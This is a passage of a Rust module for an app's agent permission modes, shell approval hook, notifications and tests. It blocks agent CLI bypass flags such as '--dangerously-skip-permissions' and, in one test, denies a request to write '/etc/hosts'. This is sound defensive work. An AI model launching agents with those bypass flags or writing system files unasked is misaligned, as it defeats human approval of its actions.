//! Agent permission modes (`Skip` vs `Ask`), session hook generators, file-backed
//! approval bridge (`<session_dir>/approvals/`), and unfocused-window OS notifications (`#656`).

use crate::comments::settings;
use crate::terminal::{AgentCliPreset, PermissionMode};
use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};

pub const SETTING_KEY: &str = "agent_permission_mode";
pub const APPROVAL_HOOK_TIMEOUT_SECS: u64 = 300;
pub const MAX_INPUT_SUMMARY_CHARS: usize = 200;

/// Global agent permission mode persisted in `<library>/settings.json` under `"agent_permission_mode"`.
pub type AgentPermissionMode = PermissionMode;

impl PermissionMode {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Skip => "skip",
            Self::Ask => "ask",
        }
    }

    /// Skip only for exactly `"skip"` (trimmed, case-insensitive). Anything else, including `""`, is Ask (fail closed, `#841`).
    pub fn parse(raw: &str) -> Self {
        if raw.trim().eq_ignore_ascii_case("skip") {
            Self::Skip
        } else {
            Self::Ask
        }
    }
}

/// Modes the user picked whose save to `settings.json` failed (read-only library, full disk), per library root.
/// The picked mode keeps applying in this process: reading the older value still on disk would silently turn
/// Ask back into Skip at the next agent start. A later successful save of that root clears its entry.
static UNSAVED_MODES: Mutex<BTreeMap<PathBuf, AgentPermissionMode>> = Mutex::new(BTreeMap::new());

fn unsaved_modes() -> std::sync::MutexGuard<'static, BTreeMap<PathBuf, AgentPermissionMode>> {
    UNSAVED_MODES.lock().unwrap_or_else(|poisoned| poisoned.into_inner())
}

/// Reads `"agent_permission_mode"` from `<root>/settings.json`. A missing, unknown or unreadable value is
/// [`AgentPermissionMode::Ask`] (fail closed, `#841`).
pub fn load_permission_mode(root: &Path) -> AgentPermissionMode {
    load_saved_permission_mode(root).unwrap_or_default()
}

/// The mode in force for `<root>`: the one whose save failed, else the one saved in `<root>/settings.json`, or
/// `None` when neither exists. Unlike [`load_permission_mode`] it does not invent a default, so a caller can keep
/// its in-memory mode.
pub fn load_saved_permission_mode(root: &Path) -> Option<AgentPermissionMode> {
    if let Some(mode) = unsaved_modes().get(root) {
        return Some(*mode);
    }
    settings::load_choice(root, SETTING_KEY).map(|s| AgentPermissionMode::parse(&s))
}

/// Persists `"agent_permission_mode"` (`"skip"` or `"ask"`) to `<root>/settings.json`. A failed save is
/// remembered for this process (see [`UNSAVED_MODES`]) so the chosen mode still applies; the error is returned.
pub fn save_permission_mode(root: &Path, mode: AgentPermissionMode) -> Result<(), String> {
    let saved = settings::save_choice(root, SETTING_KEY, mode.as_str());
    match &saved {
        Ok(()) => {
            unsaved_modes().remove(root);
        }
        Err(_) => {
            unsaved_modes().insert(root.to_path_buf(), mode);
        }
    }
    saved
}

/// Strips the auto-approve / skip-permissions flag from a CLI command string when in `Ask` mode.
pub fn strip_skip_permission_flags(cmd: &str) -> String {
    cmd.replace(" --dangerously-skip-permissions", "")
        .replace(" --dangerously-bypass-approvals-and-sandbox", "")
        .replace(" --always-approve", "")
        .replace(" --approval-mode yolo", " --approval-mode default")
}

/// Mode-aware wrapper around [`crate::agent_sessions::build_new_session_command`].
pub fn build_new_session_command_for_mode(preset: AgentCliPreset, mode: AgentPermissionMode, session_uuid: Option<&str>) -> String {
    let base = crate::agent_sessions::build_new_session_command(preset, session_uuid);
    match mode {
        AgentPermissionMode::Skip => base,
        AgentPermissionMode::Ask => strip_skip_permission_flags(&base),
    }
}

/// Mode-aware wrapper around [`crate::agent_sessions::build_resume_command_scoped`].
pub fn build_resume_command_for_mode(
    entry: &crate::agent_sessions::SessionEntry,
    codex_cwd_scoped: bool,
    agy_cwd_scoped: bool,
    mode: AgentPermissionMode,
) -> Option<String> {
    let base = crate::agent_sessions::build_resume_command_scoped(entry, codex_cwd_scoped, agy_cwd_scoped)?;
    Some(match mode {
        AgentPermissionMode::Skip => base,
        AgentPermissionMode::Ask => strip_skip_permission_flags(&base),
    })
}

/// Generates the POSIX `sh` script written to `<session_dir>/approve-hook.sh` for Claude Code's
/// `PermissionRequest` hook in `Ask` mode.
pub fn approval_hook_script(session_dir: &Path) -> String {
    let session_dir_escaped = session_dir.display().to_string().replace('\'', "'\\''");
    format!(
        r#"#!/bin/sh
set -eu

DEFAULT_SESSION_DIR='{session_dir_escaped}'
SESSION_DIR="${{DESIGNOS_SESSION_DIR:-$DEFAULT_SESSION_DIR}}"
APPROVALS_DIR="${{DESIGNOS_APPROVALS_DIR:-$SESSION_DIR/approvals}}"
STATUS_FILE="$SESSION_DIR/agent-status.json"

mkdir -p "$APPROVALS_DIR"
printf '{{"state":"waiting"}}\n' > "$STATUS_FILE" 2>/dev/null || true

REQ_ID="${{DESIGNOS_APPROVAL_REQUEST_ID:-req-$$-$(date +%s)}}"
REQ_TMP="$APPROVALS_DIR/$REQ_ID.request.tmp"
REQ_FILE="$APPROVALS_DIR/$REQ_ID.request.json"
ANS_FILE="$APPROVALS_DIR/$REQ_ID.answer"
NOW_TS="$(date +%s)"

awk -v req_id="$REQ_ID" -v ts="$NOW_TS" '
function extract_json_str(text, key,    pat, rest, i, c, nxt, out) {{
    pat = "\"" key "\"[[:space:]]*:[[:space:]]*\""
    if (!match(text, pat)) return ""
    rest = substr(text, RSTART + RLENGTH)
    out = ""
    i = 1
    while (i <= length(rest)) {{
        c = substr(rest, i, 1)
        if (c == "\\") {{
            if (i + 1 <= length(rest)) {{
                nxt = substr(rest, i + 1, 1)
                if (nxt == "\"" || nxt == "\\" || nxt == "/") {{
                    out = out nxt
                }} else if (nxt == "n" || nxt == "r" || nxt == "t") {{
                    out = out " "
                }} else {{
                    out = out nxt
                }}
                i += 2
                continue
            }} else {{
                break
            }}
        }} else if (c == "\"") {{
            break
        }} else {{
            out = out c
            i += 1
        }}
    }}
    return out
}}
function json_escape(s,    i, c, out) {{
    out = ""
    for (i = 1; i <= length(s); i++) {{
        c = substr(s, i, 1)
        if (c == "\\") out = out "\\\\"
        else if (c == "\"") out = out "\\\""
        else out = out c
    }}
    return out
}}
{{
    buf = buf " " $0
}}
END {{
    gsub(/[\r\n\t]+/, " ", buf)
    tool = extract_json_str(buf, "tool_name")
    if (length(tool) == 0) tool = "tool"
    summary = extract_json_str(buf, "command")
    if (length(summary) == 0) summary = extract_json_str(buf, "file_path")
    if (length(summary) == 0) summary = extract_json_str(buf, "path")
    if (length(summary) == 0) summary = extract_json_str(buf, "pattern")
    gsub(/[\r\n\t]+/, " ", summary)
    sub(/^[[:space:]]+/, "", summary)
    sub(/[[:space:]]+$/, "", summary)
    if (length(summary) == 0) {{
        summary = tool
    }}
    printf "{{\"id\":\"%s\",\"tool_name\":\"%s\",\"input_summary\":\"%s\",\"timestamp\":%s}}\n", req_id, json_escape(tool), json_escape(summary), ts
}}
' > "$REQ_TMP"

mv -f "$REQ_TMP" "$REQ_FILE"

TIMEOUT_MS="${{DESIGNOS_APPROVAL_TIMEOUT_MS:-300000}}"
ELAPSED_MS=0
while [ "$ELAPSED_MS" -lt "$TIMEOUT_MS" ]; do
    if [ -f "$ANS_FILE" ]; then
        DECISION="$(tr -d ' \t\r\n' < "$ANS_FILE" 2>/dev/null || true)"
        rm -f "$REQ_FILE" "$ANS_FILE"
        case "$DECISION" in
            allow)
                printf '{{"hookSpecificOutput":{{"hookEventName":"PermissionRequest","decision":{{"behavior":"allow"}}}}}}\n'
                exit 0
                ;;
            deny)
                printf '{{"hookSpecificOutput":{{"hookEventName":"PermissionRequest","decision":{{"behavior":"deny","message":"Denied in design:os studio"}}}}}}\n'
                exit 0
                ;;
            *)
                exit 0
                ;;
        esac
    fi
    sleep 0.1
    ELAPSED_MS=$((ELAPSED_MS + 100))
done

exit 0
"#
    )
}

/// Writes `<session_dir>/approve-hook.sh` and marks it executable on Unix.
pub fn write_approval_hook_script(session_dir: &Path) -> PathBuf {
    let _ = std::fs::create_dir_all(session_dir);
    let script_path = session_dir.join("approve-hook.sh");
    let content = approval_hook_script(session_dir);
    let _ = designos_library::write_atomic(&script_path, content.as_bytes());
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        if let Ok(meta) = std::fs::metadata(&script_path) {
            let mut perms = meta.permissions();
            perms.set_mode(0o755);
            let _ = std::fs::set_permissions(&script_path, perms);
        }
    }
    script_path
}

/// Handler appended to Claude's `PermissionRequest` hook group in `Ask` mode: runs `approve-hook.sh`, which blocks up
/// to `APPROVAL_HOOK_TIMEOUT_SECS` for the answer given in the in-panel approval card, and never sets
/// `permissions.allow` (`#656`). It runs next to the status handler of that group, so the turn status
/// (`agent-events.jsonl`) still sees the request.
pub fn approval_hook_handler(script_path: &Path) -> serde_json::Value {
    let s = script_path.display().to_string().replace('\'', "'\\''");
    serde_json::json!({
        "type": "command",
        "command": format!("sh '{s}'"),
        "timeout": APPROVAL_HOOK_TIMEOUT_SECS,
    })
}

/// One pending tool-approval request in `<session_dir>/approvals/<id>.request.json`.
#[derive(Clone, Debug, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub struct ApprovalRequest {
    pub id: String,
    pub tool_name: String,
    #[serde(alias = "summary")]
    pub input_summary: String,
    pub timestamp: u64,
}

/// Returns `<session_dir>/approvals`.
pub fn approvals_dir(session_dir: &Path) -> PathBuf {
    session_dir.join("approvals")
}

/// Returns the per-tab approvals directory `<session_dir>/approvals/tab-<tab_id>` (`#656`).
pub fn tab_approvals_dir(session_dir: &Path, tab_id: usize) -> PathBuf {
    approvals_dir(session_dir).join(format!("tab-{tab_id}"))
}

/// Returns `<session_dir>/approve-hook.sh`.
pub fn approval_hook_script_path(session_dir: &Path) -> PathBuf {
    session_dir.join("approve-hook.sh")
}

/// Cleans up stale approval requests older than [`APPROVAL_HOOK_TIMEOUT_SECS`].
pub fn cleanup_stale_approvals(session_dir: &Path, now_secs: u64) {
    let root = approvals_dir(session_dir);
    let _ = poll_approvals_in_dir(&root, now_secs, APPROVAL_HOOK_TIMEOUT_SECS);
    if let Ok(entries) = std::fs::read_dir(&root) {
        for entry in entries.flatten() {
            let p = entry.path();
            if p.is_dir() {
                let _ = poll_approvals_in_dir(&p, now_secs, APPROVAL_HOOK_TIMEOUT_SECS);
            }
        }
    }
}

/// Decision written by Studio to `<session_dir>/approvals/<id>.answer`.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ApprovalDecision {
    Allow,
    Deny,
    Withdrawn,
}

impl ApprovalDecision {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Allow => "allow",
            Self::Deny => "deny",
            Self::Withdrawn => "withdrawn",
        }
    }
}

/// Summarizes a `PermissionRequest`'s `tool_input` to at most [`MAX_INPUT_SUMMARY_CHARS`] characters,
/// never including file bodies (`content`, `new_string`, `old_string`).
pub fn summarize_tool_input(tool_name: &str, tool_input: &serde_json::Value) -> String {
    let raw = tool_input
        .get("command")
        .or_else(|| tool_input.get("file_path"))
        .or_else(|| tool_input.get("path"))
        .or_else(|| tool_input.get("pattern"))
        .and_then(|v| v.as_str())
        .unwrap_or(tool_name);
    let cleaned: String = raw.chars().map(|c| if c.is_control() { ' ' } else { c }).collect();
    let trimmed = cleaned.trim();
    let fallback = if trimmed.is_empty() { tool_name } else { trimmed };
    fallback.chars().take(MAX_INPUT_SUMMARY_CHARS).collect()
}

/// Polls `<approvals_dir>/*.request.json`, cleaning up any stale request files older than
/// `timeout_secs` and returning active requests ordered oldest-first.
pub fn poll_approvals_in_dir(approvals_dir: &Path, now_secs: u64, timeout_secs: u64) -> Vec<ApprovalRequest> {
    let Ok(entries) = std::fs::read_dir(approvals_dir) else {
        return Vec::new();
    };
    let mut requests = Vec::new();
    for entry in entries.flatten() {
        let path = entry.path();
        let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
            continue;
        };
        if !name.ends_with(".request.json") {
            continue;
        }
        let Ok(bytes) = std::fs::read(&path) else {
            continue;
        };
        let raw = String::from_utf8_lossy(&bytes);
        let Ok(mut req) = serde_json::from_str::<ApprovalRequest>(&raw) else {
            continue;
        };
        let ans = approvals_dir.join(format!("{}.answer", req.id));
        if req.timestamp > 0 && now_secs.saturating_sub(req.timestamp) > timeout_secs {
            let _ = std::fs::remove_file(&path);
            let _ = std::fs::remove_file(&ans);
            continue;
        }
        if ans.exists() {
            continue;
        }
        if req.input_summary.chars().count() > MAX_INPUT_SUMMARY_CHARS {
            req.input_summary = req.input_summary.chars().take(MAX_INPUT_SUMMARY_CHARS).collect();
        }
        requests.push(req);
    }
    requests.sort_by(|a, b| (a.timestamp, &a.id).cmp(&(b.timestamp, &b.id)));
    requests
}

/// Polls `<session_dir>/approvals/*.request.json`, cleaning up any stale request files older than
/// `timeout_secs` and returning active requests ordered oldest-first.
pub fn poll_approvals_dir(session_dir: &Path, now_secs: u64, timeout_secs: u64) -> Vec<ApprovalRequest> {
    poll_approvals_in_dir(&approvals_dir(session_dir), now_secs, timeout_secs)
}

/// Writes `<approvals_dir>/<id>.answer` (`allow`, `deny`, or `withdrawn`).
pub fn write_approval_answer_in_dir(approvals_dir: &Path, id: &str, decision: ApprovalDecision) -> std::io::Result<()> {
    std::fs::create_dir_all(approvals_dir)?;
    let ans_path = approvals_dir.join(format!("{id}.answer"));
    designos_library::write_atomic(&ans_path, decision.as_str().as_bytes()).map_err(|e| std::io::Error::other(e.to_string()))
}

/// Writes `<session_dir>/approvals/<id>.answer` (`allow`, `deny`, or `withdrawn`).
pub fn write_approval_answer(session_dir: &Path, id: &str, decision: ApprovalDecision) -> std::io::Result<()> {
    write_approval_answer_in_dir(&approvals_dir(session_dir), id, decision)
}

/// Writes `withdrawn` to `<id>.answer` for every pending `<id>.request.json` in `approvals_dir`.
pub fn withdraw_pending_requests_in_dir(approvals_dir: &Path) {
    let Ok(entries) = std::fs::read_dir(approvals_dir) else {
        return;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
            continue;
        };
        if let Some(id) = name.strip_suffix(".request.json") {
            let _ = write_approval_answer_in_dir(approvals_dir, id, ApprovalDecision::Withdrawn);
        }
    }
}

/// Writes `withdrawn` to `<id>.answer` for every pending `<id>.request.json` in `<session_dir>/approvals/`
/// (and any `tab-*` subdirectories).
pub fn withdraw_pending_requests(session_dir: &Path) {
    let root = approvals_dir(session_dir);
    withdraw_pending_requests_in_dir(&root);
    if let Ok(entries) = std::fs::read_dir(&root) {
        for entry in entries.flatten() {
            let p = entry.path();
            if p.is_dir() {
                withdraw_pending_requests_in_dir(&p);
            }
        }
    }
}

/// Abstraction over OS notifications when a tab transitions into `Needs approval` while Studio is unfocused.
pub trait ApprovalNotifier: Send + Sync {
    fn notify_needs_approval(&self, cli_label: &str, doc_name: &str);
}

/// Production notifier using `osascript` on macOS and `notify-send` on Linux, passing strings only via `argv`.
#[derive(Default)]
pub struct OsApprovalNotifier;

impl ApprovalNotifier for OsApprovalNotifier {
    fn notify_needs_approval(&self, cli_label: &str, doc_name: &str) {
        let title = "design:os studio";
        let body = format!("{cli_label} needs approval — {doc_name}");
        #[cfg(target_os = "macos")]
        {
            let _ = std::process::Command::new("osascript")
                .args(["-e", "on run argv\ndisplay notification (item 2 of argv) with title (item 1 of argv)\nend run", "--", title, &body])
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .spawn();
        }
        #[cfg(target_os = "linux")]
        {
            let _ = std::process::Command::new("notify-send")
                .args([title, &body])
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .spawn();
        }
        #[cfg(not(any(target_os = "macos", target_os = "linux")))]
        {
            let _ = (title, body);
        }
    }
}

/// Test double recording `(cli_label, doc_name)` notifications without spawning external commands.
#[derive(Clone, Default)]
pub struct RecordingNotifier {
    pub events: Arc<Mutex<Vec<String>>>,
}

impl RecordingNotifier {
    pub fn recorded_events(&self) -> Vec<String> {
        self.events.lock().map(|g| g.clone()).unwrap_or_default()
    }
}

impl ApprovalNotifier for RecordingNotifier {
    fn notify_needs_approval(&self, cli_label: &str, doc_name: &str) {
        if let Ok(mut guard) = self.events.lock() {
            guard.push(format!("{cli_label} needs approval — {doc_name}"));
        }
    }
}

/// Latch ensuring at most one notification fires per pending request while the Studio window is unfocused.
#[derive(Default)]
pub struct NotificationLatch {
    fired_keys: BTreeSet<String>,
}

impl NotificationLatch {
    pub fn reset(&mut self) {
        self.fired_keys.clear();
    }

    pub fn on_window_focus(&mut self) {
        self.fired_keys.clear();
    }

    pub fn clear_key(&mut self, key: &str) {
        self.fired_keys.remove(key);
    }

    /// Fires `notifier` once per `request_key` when `focused == Some(false)`.
    /// Clears the latch when the window is focused (`focused.unwrap_or(true)`) or when no request is pending.
    pub fn update(&mut self, notifier: &dyn ApprovalNotifier, focused: Option<bool>, cli_label: &str, doc_name: &str, request_key: Option<&str>) {
        if focused.unwrap_or(true) {
            self.fired_keys.clear();
            return;
        }
        let Some(key) = request_key else {
            self.fired_keys.clear();
            return;
        };
        if self.fired_keys.insert(key.to_string()) {
            notifier.notify_needs_approval(cli_label, doc_name);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::terminal::AgentCliPreset;
    use std::io::Write;
    use std::process::{Command, Stdio};

    #[test]
    fn default_mode_is_ask() {
        let tmp = std::env::temp_dir().join(format!("designos-841-default-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        std::fs::create_dir_all(&tmp).unwrap();
        assert_eq!(AgentPermissionMode::default(), AgentPermissionMode::Ask);
        assert_eq!(load_permission_mode(&tmp), AgentPermissionMode::Ask, "a library without the setting asks");
        save_permission_mode(&tmp, AgentPermissionMode::Skip).unwrap();
        assert_eq!(load_permission_mode(&tmp), AgentPermissionMode::Skip);
        save_permission_mode(&tmp, AgentPermissionMode::Ask).unwrap();
        assert_eq!(load_permission_mode(&tmp), AgentPermissionMode::Ask);
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn parse_returns_skip_only_for_the_word_skip() {
        for raw in ["skip", "Skip", "SKIP", "  skip\n"] {
            assert_eq!(AgentPermissionMode::parse(raw), AgentPermissionMode::Skip, "{raw:?} is a saved Skip");
        }
        for raw in ["ask", "ASK", "", "   ", "manual", "yolo", "skip-permissions", "skip permissions", "none", "false"] {
            assert_eq!(AgentPermissionMode::parse(raw), AgentPermissionMode::Ask, "{raw:?} must fail closed to Ask");
        }
    }

    /// The mode a library resolves to for each `settings.json` the owner listed (missing, `"skip"`, `"ask"`, `""`,
    /// `"manual"`, invalid JSON) plus other shapes a hand edit or a failed write can leave behind.
    #[test]
    fn settings_json_resolves_to_a_mode_and_fails_closed() {
        let cases: [(&str, Option<&str>, AgentPermissionMode); 11] = [
            ("missing-file", None, AgentPermissionMode::Ask),
            ("empty-object", Some("{}"), AgentPermissionMode::Ask),
            ("skip", Some(r#"{"agent_permission_mode":"skip"}"#), AgentPermissionMode::Skip),
            ("ask", Some(r#"{"agent_permission_mode":"ask"}"#), AgentPermissionMode::Ask),
            ("empty-string", Some(r#"{"agent_permission_mode":""}"#), AgentPermissionMode::Ask),
            ("manual", Some(r#"{"agent_permission_mode":"manual"}"#), AgentPermissionMode::Ask),
            ("invalid-json", Some(r#"{"agent_permission_mode": "skip""#), AgentPermissionMode::Ask),
            ("not-an-object", Some(r#""skip""#), AgentPermissionMode::Ask),
            ("truncated-to-nothing", Some(""), AgentPermissionMode::Ask),
            ("non-string-value", Some(r#"{"agent_permission_mode":true}"#), AgentPermissionMode::Ask),
            ("other-keys-only", Some(r#"{"author":"Jang"}"#), AgentPermissionMode::Ask),
        ];
        for (tag, body, expected) in cases {
            let tmp = std::env::temp_dir().join(format!("designos-841-settings-{tag}-{}", std::process::id()));
            let _ = std::fs::remove_dir_all(&tmp);
            std::fs::create_dir_all(&tmp).unwrap();
            if let Some(body) = body {
                std::fs::write(tmp.join("settings.json"), body).unwrap();
            }
            assert_eq!(load_permission_mode(&tmp), expected, "settings.json case `{tag}`");
            let _ = std::fs::remove_dir_all(&tmp);
        }
    }

    /// A new install (no library setting yet) starts every agent CLI without its skip flag.
    #[test]
    fn a_fresh_terminal_launches_every_cli_in_ask_mode() {
        let st = crate::terminal::TerminalState::default();
        assert_eq!(st.permission_mode, AgentPermissionMode::Ask);
        for preset in [AgentCliPreset::Claude, AgentCliPreset::Codex, AgentCliPreset::Grok, AgentCliPreset::Antigravity, AgentCliPreset::Gemini] {
            let cmd = build_new_session_command_for_mode(preset, st.permission_mode, Some("019a0102-0304-7506-8708-090a0b0c0d0e"));
            for flag in ["--dangerously-skip-permissions", "--dangerously-bypass-approvals-and-sandbox", "--always-approve", "--approval-mode yolo"] {
                assert!(!cmd.contains(flag), "{preset:?} fresh launch kept `{flag}`: {cmd}");
            }
        }
    }

    /// A window that loaded Skip must not keep it once the saved mode turns unreadable or disappears: the next
    /// agent it starts asks (fail closed), and a readable `"skip"` applies again.
    #[test]
    fn a_bound_window_falls_back_to_ask_when_the_saved_mode_is_unreadable() {
        let root = std::env::temp_dir().join(format!("designos-841-refresh-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();
        save_permission_mode(&root, AgentPermissionMode::Skip).unwrap();
        let mut st = crate::terminal::TerminalState::for_tab(84_101);
        st.bind_library_file(&root, "file-841", "win-841");
        assert_eq!(st.permission_mode, AgentPermissionMode::Skip, "the window loaded the saved Skip when it bound");

        for (tag, body) in
            [("invalid-json", "{\"agent_permission_mode\": \"skip\""), ("key-removed", "{}"), ("unknown-value", r#"{"agent_permission_mode":"manual"}"#)]
        {
            std::fs::write(root.join("settings.json"), body).unwrap();
            let idx = st.spawn_tab(AgentCliPreset::Shell, None).expect("spawn a tab");
            assert_eq!(st.permission_mode, AgentPermissionMode::Ask, "{tag}: the spawn must not keep the stale Skip");
            assert_eq!(st.tabs[idx].permission_mode, AgentPermissionMode::Ask, "{tag}: the new tab runs in Ask mode");

            std::fs::write(root.join("settings.json"), r#"{"agent_permission_mode":"skip"}"#).unwrap();
            let idx = st.spawn_tab(AgentCliPreset::Shell, None).expect("spawn a tab");
            assert_eq!(st.tabs[idx].permission_mode, AgentPermissionMode::Skip, "{tag}: a readable saved Skip applies again");
        }
        st.shutdown();
        let _ = std::fs::remove_dir_all(&root);
    }

    /// Commands Studio runs for screenshot fixtures and previews run whatever the user's mode is, so none of them
    /// may carry a skip or bypass flag. A new fixture command goes into this list.
    #[test]
    fn no_fixture_or_preview_command_carries_a_skip_or_bypass_flag() {
        const FIXTURE_COMMANDS: [(&str, &str); 1] = [("--panel agents-start-failure", crate::terminal::START_FAILURE_FIXTURE_COMMAND)];
        const BYPASS_FLAGS: [&str; 4] =
            ["--dangerously-skip-permissions", "--dangerously-bypass-approvals-and-sandbox", "--always-approve", "--approval-mode yolo"];
        for (fixture, command) in FIXTURE_COMMANDS {
            for flag in BYPASS_FLAGS {
                assert!(!command.contains(flag), "fixture `{fixture}` runs `{command}`, which carries `{flag}`");
            }
        }
    }

    #[test]
    fn skip_mode_launch_commands_unchanged() {
        for preset in
            [AgentCliPreset::Claude, AgentCliPreset::Codex, AgentCliPreset::Grok, AgentCliPreset::Antigravity, AgentCliPreset::Gemini, AgentCliPreset::OpenCode]
        {
            assert_eq!(preset.cli_launch_command_for_mode(AgentPermissionMode::Skip), preset.cli_launch_command());
        }
    }

    #[test]
    fn ask_mode_drops_each_skip_flag() {
        for preset in
            [AgentCliPreset::Claude, AgentCliPreset::Codex, AgentCliPreset::Grok, AgentCliPreset::Antigravity, AgentCliPreset::Gemini, AgentCliPreset::OpenCode]
        {
            let cmd = preset.cli_launch_command_for_mode(AgentPermissionMode::Ask);
            assert!(!cmd.contains("--dangerously-skip-permissions"), "{preset:?} ask command kept skip flag: {cmd}");
            assert!(!cmd.contains("--dangerously-bypass-approvals-and-sandbox"), "{preset:?} ask command kept bypass flag: {cmd}");
            assert!(!cmd.contains("--always-approve"), "{preset:?} ask command kept always-approve flag: {cmd}");
            assert!(!cmd.contains("--dangerously-bypass-hook-trust"), "{preset:?} ask command must never bypass hook trust: {cmd}");
            assert_eq!(cmd, strip_skip_permission_flags(preset.cli_launch_command()));
        }
        assert!(AgentCliPreset::Claude.cli_launch_command_for_mode(AgentPermissionMode::Ask).starts_with("claude --mcp-config"));
        assert!(AgentCliPreset::Codex.cli_launch_command_for_mode(AgentPermissionMode::Ask).starts_with("codex -c"));
        assert!(AgentCliPreset::Grok.cli_launch_command_for_mode(AgentPermissionMode::Ask).starts_with("grok --cwd"));
        assert!(AgentCliPreset::Antigravity.cli_launch_command_for_mode(AgentPermissionMode::Ask).starts_with("agy --add-dir"));
    }

    #[test]
    fn hook_script_allow_prints_the_documented_decision() {
        let tmp = std::env::temp_dir().join(format!("designos-656-hook-allow-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        std::fs::create_dir_all(&tmp).unwrap();
        let script = write_approval_hook_script(&tmp);

        let mut child = Command::new("sh").arg(&script).stdin(Stdio::piped()).stdout(Stdio::piped()).spawn().expect("spawn sh approve-hook.sh");
        let payload = serde_json::json!({
            "hook_event_name": "PermissionRequest",
            "tool_name": "Bash",
            "tool_input": { "command": "cargo test -p designos-app" }
        });
        child.stdin.take().unwrap().write_all(payload.to_string().as_bytes()).unwrap();

        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
        let req_id = loop {
            let reqs = poll_approvals_dir(&tmp, crate::agent_sessions::unix_timestamp_secs(), APPROVAL_HOOK_TIMEOUT_SECS);
            if let Some(first) = reqs.first() {
                break first.id.clone();
            }
            assert!(std::time::Instant::now() < deadline, "Timed out waiting for request file");
            std::thread::sleep(std::time::Duration::from_millis(25));
        };
        write_approval_answer(&tmp, &req_id, ApprovalDecision::Allow).unwrap();

        let out = child.wait_with_output().unwrap();
        assert!(out.status.success());
        let parsed: serde_json::Value = serde_json::from_slice(&out.stdout).expect("valid JSON decision");
        assert_eq!(parsed["hookSpecificOutput"]["hookEventName"], "PermissionRequest");
        assert_eq!(parsed["hookSpecificOutput"]["decision"]["behavior"], "allow");
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn hook_script_deny_carries_a_message() {
        let tmp = std::env::temp_dir().join(format!("designos-656-hook-deny-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        std::fs::create_dir_all(&tmp).unwrap();
        let script = write_approval_hook_script(&tmp);

        let mut child = Command::new("sh").arg(&script).stdin(Stdio::piped()).stdout(Stdio::piped()).spawn().expect("spawn sh approve-hook.sh");
        let payload = serde_json::json!({
            "hook_event_name": "PermissionRequest",
            "tool_name": "Write",
            "tool_input": { "file_path": "/etc/hosts", "content": "secret" }
        });
        child.stdin.take().unwrap().write_all(payload.to_string().as_bytes()).unwrap();

        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
        let req_id = loop {
            let reqs = poll_approvals_dir(&tmp, crate::agent_sessions::unix_timestamp_secs(), APPROVAL_HOOK_TIMEOUT_SECS);
            if let Some(first) = reqs.first() {
                break first.id.clone();
            }
            assert!(std::time::Instant::now() < deadline, "Timed out waiting for request file");
            std::thread::sleep(std::time::Duration::from_millis(25));
        };
        write_approval_answer(&tmp, &req_id, ApprovalDecision::Deny).unwrap();

        let out = child.wait_with_output().unwrap();
        assert!(out.status.success());
        let parsed: serde_json::Value = serde_json::from_slice(&out.stdout).expect("valid JSON decision");
        assert_eq!(parsed["hookSpecificOutput"]["hookEventName"], "PermissionRequest");
        assert_eq!(parsed["hookSpecificOutput"]["decision"]["behavior"], "deny");
        assert!(!parsed["hookSpecificOutput"]["decision"]["message"].as_str().unwrap_or_default().is_empty());
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn hook_script_timeout_prints_nothing() {
        let tmp = std::env::temp_dir().join(format!("designos-656-hook-timeout-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        std::fs::create_dir_all(&tmp).unwrap();
        let script = write_approval_hook_script(&tmp);

        let mut child = Command::new("sh")
            .arg(&script)
            .env("DESIGNOS_APPROVAL_TIMEOUT_MS", "300")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .spawn()
            .expect("spawn sh approve-hook.sh");
        let payload = serde_json::json!({
            "hook_event_name": "PermissionRequest",
            "tool_name": "Bash",
            "tool_input": { "command": "echo hi" }
        });
        child.stdin.take().unwrap().write_all(payload.to_string().as_bytes()).unwrap();

        let out = child.wait_with_output().unwrap();
        assert!(out.status.success());
        assert!(out.stdout.is_empty(), "Timeout must print nothing to stdout: {:?}", String::from_utf8_lossy(&out.stdout));
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn request_file_holds_only_a_summary() {
        let long_cmd = "x".repeat(5000);
        let input = serde_json::json!({
            "command": long_cmd,
            "content": "SUPER_SECRET_FILE_BODY",
            "new_string": "SUPER_SECRET_NEW_STRING"
        });
        let summary = summarize_tool_input("Bash", &input);
        assert_eq!(summary.chars().count(), MAX_INPUT_SUMMARY_CHARS);
        assert!(!summary.contains("SUPER_SECRET"));

        // Also verify the POSIX awk script in approve-hook.sh writes a 200-char summary to .request.json
        let tmp = std::env::temp_dir().join(format!("designos-656-hook-summary-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        std::fs::create_dir_all(&tmp).unwrap();
        let script = write_approval_hook_script(&tmp);
        let mut child = Command::new("sh")
            .arg(&script)
            .env("DESIGNOS_APPROVAL_TIMEOUT_MS", "200")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .spawn()
            .expect("spawn sh approve-hook.sh");
        let payload = serde_json::json!({
            "hook_event_name": "PermissionRequest",
            "tool_name": "Bash",
            "tool_input": input,
        });
        child.stdin.take().unwrap().write_all(payload.to_string().as_bytes()).unwrap();
